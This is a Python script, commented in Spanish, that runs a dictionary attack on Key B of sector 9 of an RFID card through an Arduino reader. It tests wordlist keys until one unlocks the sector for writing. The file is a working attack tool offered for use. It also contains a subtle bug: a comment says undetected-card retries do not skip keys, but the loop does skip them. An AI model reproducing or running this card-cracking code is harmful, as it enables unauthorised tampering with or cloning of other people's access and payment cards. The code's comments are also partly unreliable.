import serial
import time
import sys

# --- CONFIGURACIÓN ---
PUERTO = 'COM5'
BAUDIOS = 115200
SECTOR_OBJETIVO = 9
ARCHIVO_DICCIONARIO = 'diccionario_pro.txt'
#ARCHIVO_DICCIONARIO = 'diccionario_nuclear_sector9.txt'

def ataque_diccionario_b():
    try:
        arduino = serial.Serial(PUERTO, BAUDIOS, timeout=1)
        time.sleep(2)
        print(f"[*] Conectado a Arduino en {PUERTO}")
    except:
        print("[-] Error conectando al Arduino. Revisa el puerto COM."); return

    # Cargar claves del archivo
    try:
        with open(ARCHIVO_DICCIONARIO, 'r') as f:
            claves = [linea.strip().upper() for linea in f if len(linea.strip()) == 12]
        print(f"[*] Diccionario cargado: {len(claves)} claves únicas para probar.")
    except FileNotFoundError:
        print(f"[-] Error: No se encuentra {ARCHIVO_DICCIONARIO}"); return

    print(f"[*] Iniciando ATAQUE DE DICCIONARIO - KEY B - Sector {SECTOR_OBJETIVO}")
    print("[!] Coloca la tarjeta y no la muevas...\n")

    for i, clave in enumerate(claves, 1):
        # Intentar el comando contra el Arduino (usando el firmware que ya tienes)
        # Comando: B,Sector,Clave
        arduino.write(f"B,{SECTOR_OBJETIVO},{clave}\n".encode())
        
        # Esperar respuesta
        resp = arduino.readline().decode().strip()

        if "OK:" in resp:
            print(f"\n\n[🚀] ¡BINGO! CLAVE B ENCONTRADA: {clave}")
            print(f"[*] Sector {SECTOR_OBJETIVO} desbloqueado para ESCRITURA.")
            break
        elif resp == "F":
            sys.stdout.write(f"\r[-] [{i}/{len(claves)}] Probando: {clave} -> Incorrecta.")
            sys.stdout.flush()
        elif resp == "N":
            sys.stdout.write(f"\r[!] Tarjeta no detectada. Acércala al lector...")
            sys.stdout.flush()
            time.sleep(0.5)
            # No avanzamos el contador para no saltarnos la clave
            continue
    else:
        print("\n\n[x] Diccionario agotado. Ninguna clave funcionó.")
        print("[!] Esto confirma que la Key B es diversificada (única por tarjeta).")

    arduino.close()

if __name__ == "__main__":
    ataque_diccionario_b()